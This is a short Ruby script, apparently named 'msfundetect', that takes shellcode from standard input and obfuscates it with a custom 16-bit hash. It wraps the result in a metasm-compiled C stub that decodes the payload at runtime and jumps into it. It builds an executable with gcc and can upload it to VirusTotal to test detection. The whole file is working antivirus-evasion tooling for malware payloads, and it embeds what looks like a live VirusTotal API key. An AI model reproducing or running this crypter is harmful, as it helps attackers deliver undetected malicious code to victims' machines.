require 'metasm'

z = $stdin.binmode.read.to_s
def w(i) "__asm('dw 0#{i.to_s(16)}h');" end

f = '
y = 0xFFFF & (0xFF ^ i & 0xFF);
y = 0xFFFF & (y ^ (y >> 4));
x = 0xFFFF & (0xFFFF00 ^ y << 12 ^ y << 5 ^ y);
y = 0xFFFF & (x >> 8 ^ (i & 0xFF00) >> 8);
y = 0xFFFF & (y ^ (y >> 4));
x = 0xFFFF & (x << 8 ^ y << 12 ^ y << 5 ^ y);
'

c = '
int t(int);
void s();
void v()
{
	unsigned short d[1024];
	unsigned short* e = s;
	int j;
	int i;
	for (j = 1; j <= *e / 2; j++) for (i = 0; i <= 0xFFFF; i++) if (e[j] == t(i)) d[j - 1] = i;
	((void (*)())d)();
}
int t(int i)
{
	int x;
	int y;
	' + f + '
	return x;
}
void s(){' + w(z.size) + z.unpack('v*').map{|i| w(eval(f))}.join + '}
'

m = Metasm::Shellcode.new(Metasm::Ia32.new)
j = m.parse(m.cpu.new_ccompiler(m.cpu.new_cparser.parse(c), m).compile).assemble.encode_string
open('j.c', 'wb'){|x| x << "int main(){#{j.unpack('C*').map{|y| '__asm(".byte 0x%02x");' % y}.join}}\n"}
`gcc j.c`
case ARGV[1].downcase
	when 'r', 'raw' then $stdout.binmode << j
	when 'c', 'rb' || 'py' || 'pl' then puts j.unpack('C*').map{|i| '\\x%02x' % i}.join
	when 'v', 'vt' then require 'virustotal';p VirusTotal::VirusTotal.new('a532cceb55d2ba30e17d76f239f97c33c43dc7f9e444c5f94a62ce850bb575eb', 1).query_upload('a.exe').results
	when 'x', 'exe' then open('a.exe', 'rb'){|i| $stdout.binmode << i.read}
	else $stdout.binmode << "usage: msfundetect -t <format> \n formats: exe raw c rb py pl vt (vt for virustotal check which takes some minutes)"
end